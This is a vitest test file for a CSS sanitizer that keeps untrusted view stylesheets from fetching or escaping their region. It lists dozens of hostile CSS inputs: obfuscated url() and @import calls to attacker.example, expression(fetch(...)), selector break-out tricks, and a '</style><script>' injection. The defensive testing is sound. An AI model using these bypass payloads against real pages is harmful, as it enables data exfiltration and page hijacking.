import { describe, expect, it } from "vitest";
import { sanitizeDeclarations, sanitizeStylesheet, sanitizeValue, tokenize } from "../../src/host/css.js";
import { CSS_FUNCTIONS, CSS_PROPERTIES } from "../../src/open-kit.js";

/**
 * A VIEW'S CSS KEEPS NOTHING THAT FETCHES OR ESCAPES (FR-90). Every case is
 * a stylesheet a hostile view might write; what is drawn is read back with
 * the same tokenizer a browser uses, and must hold no `url` token or
 * function but a fragment, no at-rule outside the four, and no `position`
 * that leaves the region. That the browsers agree — that nothing is
 * requested from the page — is `scripts/guest-sandbox.mjs --transport=open`
 * in Chromium, WebKit and Firefox.
 */

/** Everything a browser would read in what was kept that could reach out. */
function reaches(css: string): string[] {
  const found: string[] = [];
  for (const token of tokenize(css)) {
    if (token.type === "url" || token.type === "bad-url") found.push(`url token ${JSON.stringify(token)}`);
    if (token.type === "function" && !CSS_FUNCTIONS.includes(token.value.toLowerCase()) && token.value.toLowerCase() !== "url") found.push(`function ${token.value}`);
    if (token.type === "at-keyword" && !["media", "supports", "container", "keyframes"].includes(token.value.toLowerCase())) found.push(`@${token.value}`);
  }
  /* A url() function is kept only around a fragment: `url("#id")`. */
  for (const match of css.matchAll(/url\(\s*("([^"]*)"|'([^']*)'|[^)]*)\s*\)/gi)) {
    const inside = match[2] ?? match[3] ?? match[1] ?? "";
    if (!/^#[A-Za-z_][\w.:-]*$/.test(inside)) found.push(`url(${inside})`);
  }
  return found;
}

/** Every property that takes a URL in some browser, written with one. */
const URL_PROPERTIES = [
  "background", "background-image", "border-image", "border-image-source", "list-style", "list-style-image", "cursor", "content", "mask", "mask-image",
  "-webkit-mask-image", "-webkit-mask", "mask-border-source", "filter", "clip-path", "shape-outside", "offset-path", "src", "fill", "stroke", "marker",
  "marker-start", "marker-mid", "marker-end", "behavior", "-moz-binding", "--custom", "font", "background-attachment", "list-style-type", "-webkit-border-image",
];

describe("every property that takes a url()", () => {
  for (const property of URL_PROPERTIES) {
    it(`keeps no url() in ${property}`, () => {
      const said = sanitizeStylesheet(`.x { ${property}: url(https://attacker.example/${property}); }`);
      expect(reaches(said.css)).toEqual([]);
      expect(said.css).not.toContain("attacker");
      expect(said.refused.length).toBeGreaterThan(0);
    });
    it(`keeps no quoted url("…") in ${property}`, () => {
      const said = sanitizeStylesheet(`.x { ${property}: url("https://attacker.example/${property}") }`);
      expect(reaches(said.css)).toEqual([]);
      expect(said.css).not.toContain("attacker");
    });
  }
});

/** One case, by name: the stylesheet, and what of the attacker's must not be in what is kept. */
const CASES: Record<string, string> = {
  "an escaped url, u\\72l(": `.x { background: u\\72l(https://attacker.example/escaped) }`,
  "an escaped url, \\75 rl(": `.x { background: \\75 rl(https://attacker.example/escaped2) }`,
  "an escaped url in capitals, \\55\\52\\4c(": `.x { background: \\55\\52\\4c(https://attacker.example/escaped3) }`,
  "url in capitals": `.x { background: URL(https://attacker.example/upper) }`,
  "url with whitespace and a comment inside": `.x { background: url( /*x*/ https://attacker.example/comment ) }`,
  "url broken by a comment": `.x { background: url/**/(https://attacker.example/broken) }`,
  "a bad url": `.x { background: url(https://attacker.example/bad"url) }`,
  "src()": `.x { background: src("https://attacker.example/src") }`,
  "image-set()": `.x { background-image: image-set("https://attacker.example/set.png" 1x) }`,
  "-webkit-image-set()": `.x { background-image: -webkit-image-set(url(https://attacker.example/wset.png) 1x) }`,
  "image-set() without url": `.x { background-image: image-set("https://attacker.example/set2.png" 1x, "x.png" 2x) }`,
  "cross-fade()": `.x { background-image: cross-fade(url(https://attacker.example/a.png), url(https://attacker.example/b.png), 50%) }`,
  "-webkit-cross-fade()": `.x { background-image: -webkit-cross-fade(url(https://attacker.example/c.png), url(x.png), 50%) }`,
  "element()": `.x { background: -moz-element(#host-secret) }`,
  "paint()": `.x { background: paint(attacker) }`,
  "image()": `.x { background: image("https://attacker.example/image.png") }`,
  "attr()": `.x::after { content: attr(data-secret) }`,
  "attr() typed as a url": `.x { background-image: attr(data-src type(<url>)) }`,
  "expression()": `.x { width: expression(fetch("https://attacker.example/expr")) }`,
  "@import": `@import url(https://attacker.example/import.css); .x { color: red }`,
  "@import of a string": `@import "https://attacker.example/import2.css"; .x { color: red }`,
  "an escaped @import": `@\\69mport "https://attacker.example/import3.css";`,
  "@import inside @media": `@media screen { @import "https://attacker.example/import4.css"; }`,
  "@font-face with a src": `@font-face { font-family: x; src: url(https://attacker.example/font.woff2) format("woff2"); } .x { font-family: x }`,
  "@font-face with local()": `@font-face { font-family: y; src: local("Arial"), url(https://attacker.example/font2.woff) }`,
  "@namespace": `@namespace svg url(https://attacker.example/ns);`,
  "@property": `@property --x { syntax: "<url>"; inherits: false; initial-value: url(https://attacker.example/prop) }`,
  "@layer with a url inside": `@layer a { .x { background: url(https://attacker.example/layer) } }`,
  "@page": `@page { background: url(https://attacker.example/page) }`,
  "@counter-style": `@counter-style x { symbols: url(https://attacker.example/counter.png); }`,
  "@document": `@-moz-document url-prefix() { .x { background: url(https://attacker.example/doc) } }`,
  "a custom property holding a url": `.x { --bg: url(https://attacker.example/custom); background: var(--bg) }`,
  "a custom property holding image-set": `.x { --bg: image-set("https://attacker.example/custom2.png" 1x); background-image: var(--bg) }`,
  "a url spread over two custom properties": `.x { --a: url(; --b: https://attacker.example/split); background: var(--a)var(--b) }`,
  "@supports wrapping a url": `@supports (display: grid) { .x { background: url(https://attacker.example/supports) } }`,
  "@supports asking about a url": `@supports (background: url(https://attacker.example/supports-q)) { .x { color: red } }`,
  "@media wrapping a url": `@media (min-width: 1px) { .x { background: url(https://attacker.example/media) } }`,
  "nested at-rules": `@media screen { @supports (color: red) { @media (min-width: 1px) { .x { background: url(https://attacker.example/nested) } } } }`,
  "a url inside keyframes": `@keyframes k { from { background: url(https://attacker.example/kf) } to { color: red } }`,
  "a url in a nested rule": `.x { color: red; & .y { background: url(https://attacker.example/nesting) } }`,
  "a url in a nested @media": `.x { @media (min-width: 1px) { background-image: url(https://attacker.example/nested-media) } }`,
  "a url in a media query": `@media (min-width: url(https://attacker.example/mq)) { .x { color: red } }`,
  "a url behind !important": `.x { background: url(https://attacker.example/important) !important }`,
  "a url in a property spelled with an escape": `.x { b\\61 ckground: url(https://attacker.example/prop-escape) }`,
  "cursor with a fallback": `.x { cursor: url(https://attacker.example/cursor.cur), auto }`,
  "list-style-image": `.x { list-style-image: url("https://attacker.example/bullet.png") }`,
  "content: url()": `.x::before { content: url(https://attacker.example/content.png) }`,
  "border-image": `.x { border-image: url(https://attacker.example/border.png) 30 round }`,
  "a fragment url on a property that is not a paint": `.x { background: url(#local) }`,
  "a data: url": `.x { background: url(data:image/png;base64,AAAA) }`,
  "a CDO and CDC": `<!-- .x { background: url(https://attacker.example/cdo) } -->`,
  "an unterminated string": `.x { content: "https://attacker.example/unterminated \n background: url(https://attacker.example/after) }`,
  "an unterminated comment": `.x { color: red } /* .y { background: url(https://attacker.example/comment-end) }`,
  "a backslash newline": `.x { background: url\\\n(https://attacker.example/bsnl) }`,
  "a selector reaching the host": `:host { position: fixed; inset: 0; z-index: 2147483647; background: red }`,
  "a selector reaching the host, escaped": `:\\68 ost { position: fixed }`,
  "::slotted": `::slotted(*) { position: fixed }`,
  ":host-context": `:host-context(body) { display: none }`,
  "::part": `::part(x) { color: red }`,
  /* A CDC or CDO between the colon and the name: never judged as `:host`, and once dropped from what was written back, read as it. */
  "a selector reaching the host past a CDC": `:-->host { contain: none !important; overflow: visible !important; position: static !important }`,
  "a selector reaching the host past a CDO": `:<!--host { translate: 0 -400px !important }`,
  "::slotted past a CDC": `::-->slotted(*) { color: red }`,
  ":host-context past a CDC, nested": `.x { @media screen { :-->host-context(body) { display: none } } }`,
  "::part past a CDC, in @supports": `@supports selector(::-->part(x)) { .x { color: red } }`,
};

describe("a view's selectors for the elements the host draws as another", () => {
  it("reads nav, header, footer, aside, search and output as what the host draws them as", () => {
    expect(sanitizeStylesheet(`.package header { display: flex } NAV > a, :is(footer, aside) .x, search:hover, output.big { color: red }`).css).toBe(
      `.package [data-graview-as="header"] { display: flex; }\n[data-graview-as="nav"] > a, :is([data-graview-as="footer"], [data-graview-as="aside"]) .x, [data-graview-as="search"]:hover, [data-graview-as="output"].big { color: red; }`,
    );
  });
  it("leaves a class, an id, a pseudo-class and an attribute of the same name alone", () => {
    expect(sanitizeStylesheet(`.header, #nav, a:nav, [title=header] { color: red }`).css).toBe(`.header, #nav, a:nav, [title=header] { color: red; }`);
  });
  it("reads them so nested, too", () => {
    expect(sanitizeStylesheet(`.package { header { margin: 0 } }`).css).toBe(`.package { [data-graview-as="header"] { margin: 0; } }`);
  });
});

describe("a customizable select's picker, which is drawn in the top layer over the whole page", () => {
  it("keeps no appearance: base-select, in any spelling", () => {
    for (const css of [`select { appearance: base-select }`, `select { -webkit-appearance: base-select }`, `select { APPEARANCE: Base-Select !important }`, `select { appearance: var(--a) }`]) {
      expect(sanitizeStylesheet(css).css, css).not.toMatch(/base-select|var\(/i);
    }
  });
  it("keeps no ::picker(select) rule", () => {
    const said = sanitizeStylesheet(`::picker(select) { inset: 0; width: 100vw; height: 100vh; background: red } select::picker(select) { margin: 0 }`);
    expect(said.css).not.toMatch(/picker/i);
    expect(said.refused).toContainEqual({ reason: "selector", name: "picker" });
  });
  it("still draws the appearances that stay in the region", () => {
    expect(sanitizeStylesheet(`select { appearance: none } input { -webkit-appearance: textfield }`).css).toBe(`select { appearance: none; }\ninput { -webkit-appearance: textfield; }`);
  });
});

describe("a hostile stylesheet", () => {
  for (const [name, css] of Object.entries(CASES)) {
    it(`keeps nothing that reaches out: ${name}`, () => {
      const said = sanitizeStylesheet(css);
      expect(reaches(said.css)).toEqual([]);
      expect(said.css).not.toMatch(/attacker/);
      expect(said.css).not.toMatch(/@import|@font-face|@namespace|@property|@page|@layer|@counter-style|@-moz-document/i);
      expect(said.css).not.toMatch(/:host|::slotted|::part/i);
    });
  }
});

describe("what stays in the region", () => {
  it("drops position: fixed and sticky, in any case and with an escape", () => {
    for (const css of [".x { position: fixed }", ".x { position: FIXED }", ".x { position: sticky }", ".x { po\\73 ition: fixed }", ".x { position: f\\69 xed }", ".x { position: -webkit-sticky }"]) {
      const said = sanitizeStylesheet(css);
      expect(said.css, css).not.toMatch(/fixed|sticky/i);
      expect(said.refused, css).toContainEqual({ reason: "value", name: "position" });
    }
  });
  it("drops a position a custom property would carry in", () => {
    const said = sanitizeStylesheet(".x { --p: fixed; position: var(--p) }");
    expect(said.css).not.toMatch(/position/);
  });
  it("keeps static, relative and absolute", () => {
    expect(sanitizeStylesheet(".a { position: absolute } .b { position: relative } .c { position: static }").css).toBe(".a { position: absolute; }\n.b { position: relative; }\n.c { position: static; }");
  });
  it("keeps a z-index: the region is its own stacking context, and clips", () => {
    expect(sanitizeStylesheet(".x { z-index: 2147483647 }").css).toBe(".x { z-index: 2147483647; }");
  });
});

describe("what a view may write", () => {
  it("keeps layout, grid, flex, colour, type and the theme's tokens", () => {
    const css = `.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(12rem, 1fr)); gap: 12px }
.card { background: var(--graview-panel); color: var(--graview-ink); border: 1px solid var(--graview-edge); border-radius: 12px; padding: 12px 16px; box-shadow: 0 1px 2px rgb(0 0 0 / 0.1) }
.row { display: flex; align-items: center; justify-content: space-between; font: 600 14px/1.4 var(--graview-font-body) }`;
    const said = sanitizeStylesheet(css);
    expect(said.refused).toEqual([]);
    expect(said.css).toContain("grid-template-columns: repeat(auto-fill, minmax(12rem, 1fr))");
    expect(said.css).toContain("background: var(--graview-panel)");
  });
  it("keeps transitions, keyframes and media queries", () => {
    const css = `@keyframes spin { from { transform: rotate(0deg) } to { transform: rotate(360deg) } }
.ring { animation: spin 1.2s linear infinite; transition: stroke-dashoffset 300ms ease-out }
@media (max-width: 600px) { .grid { grid-template-columns: 1fr } }
@media (prefers-reduced-motion: reduce) { .ring { animation: none } }
@supports (display: grid) { .grid { display: grid } }
@container (min-width: 30em) { .card { padding: 24px } }`;
    const said = sanitizeStylesheet(css);
    expect(said.refused).toEqual([]);
    expect(said.css).toContain("@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }");
    expect(said.css).toContain("@media (max-width: 600px) { .grid { grid-template-columns: 1fr; } }");
    expect(said.css).toContain("@supports (display: grid)");
    expect(said.css).toContain("@container (min-width: 30em)");
  });
  it("keeps a gradient, and url(#id) on a paint", () => {
    const said = sanitizeStylesheet(`.bar { fill: url(#grad); stroke: url("#line") } .bg { background: linear-gradient(90deg, var(--graview-accent), transparent) }`);
    expect(said.refused).toEqual([]);
    expect(said.css).toContain('fill: url("#grad")');
    expect(said.css).toContain('stroke: url("#line")');
    expect(said.css).toContain("linear-gradient(90deg,");
  });
  it("keeps CSS nesting", () => {
    const said = sanitizeStylesheet(".card { color: red; &:hover { color: blue } .title { font-weight: 600 } }");
    expect(said.refused).toEqual([]);
    expect(said.css).toBe(".card { color: red; &:hover { color: blue; } .title { font-weight: 600; } }");
  });
  it("refuses a property outside the allowlist, and keeps the rest of the rule", () => {
    const said = sanitizeStylesheet(".x { color: red; -moz-binding: none; anchor-name: --a; position-anchor: --a }");
    expect(said.css).toBe(".x { color: red; }");
    expect(said.refused.map((one) => one.name)).toEqual(["-moz-binding", "anchor-name", "position-anchor"]);
  });
  it("is written afresh: a comment, an escape and a stray brace come back as tokens, not as the view wrote them", () => {
    const said = sanitizeStylesheet(".x{color:r\\65 d/*hi*/;}</style><script>alert(1)</script>");
    expect(said.css).not.toContain("</style");
    expect(said.css).not.toContain("<script");
    expect(said.css.startsWith(".x { color: red; }")).toBe(true);
  });
  it("refuses a stylesheet past its size", () => {
    expect(sanitizeStylesheet(".x{}".repeat(20_000)).refused).toEqual([{ reason: "size" }]);
  });
  it("every property on the allowlist is lower case and none is a url-taking one it should not be", () => {
    for (const property of CSS_PROPERTIES) expect(property).toBe(property.toLowerCase());
    for (const banned of ["border-image", "border-image-source", "list-style-image", "mask-image", "-webkit-mask-image", "shape-outside", "offset-path", "src", "behavior", "-moz-binding"]) expect(CSS_PROPERTIES).not.toContain(banned);
  });
});

describe("a style attribute and a presentation attribute", () => {
  it("keeps declarations and drops a url", () => {
    const said = sanitizeDeclarations("color: var(--graview-accent); background: url(https://attacker.example/inline); position: fixed; width: 40%");
    expect(said.css).toBe("color: var(--graview-accent); width: 40%");
    expect(reaches(said.css)).toEqual([]);
  });
  it("judges an SVG paint as CSS", () => {
    expect(sanitizeValue("fill", "url(#grad)")).toEqual({ value: 'url("#grad")' });
    expect(sanitizeValue("fill", "var(--graview-accent)")).toEqual({ value: "var(--graview-accent)" });
    expect(sanitizeValue("fill", "url(https://attacker.example/paint.svg#x)")).toMatchObject({ refused: { reason: "url" } });
    expect(sanitizeValue("stroke", "u\\72l(https://attacker.example/s)")).toMatchObject({ refused: { reason: "url" } });
  });
});
